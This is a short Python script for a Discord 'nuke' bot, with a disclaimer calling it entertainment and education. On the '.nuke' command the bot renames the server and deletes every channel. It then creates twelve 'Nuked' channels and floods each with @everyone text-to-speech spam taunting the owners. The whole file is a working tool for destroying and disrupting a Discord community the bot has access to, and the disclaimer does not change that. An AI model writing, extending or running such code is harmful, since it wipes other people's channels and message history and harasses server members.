# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by VN :3

import discord
from discord.ext import commands
import asyncio
import os

intents = discord.Intents.all() # required, dont remove
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix='.', intents=intents) # prefix

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def nuke(ctx):
    if not ctx.guild:
        return

    new_name = "💥 NO REVIVING TS 💥" # set server name to
    await ctx.guild.edit(name=new_name)

    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    results = await asyncio.gather(*delete_tasks, return_exceptions=True) # delete og channels

    async def create_channel(i):
        channel = await ctx.guild.create_text_channel("💣 Nuked") # name of channels being made
        for _ in range(10):
            await channel.send("> 🥱 @everyone TRY GETTING A SECURITY BOT NEXT TIME 🥱", tts = True) # ping to annoy and text to speech to also annoy

    await asyncio.gather(*[create_channel(x) for x in range(12)]) # create channels

bot.run("Your_bot_token") # token to log into bot
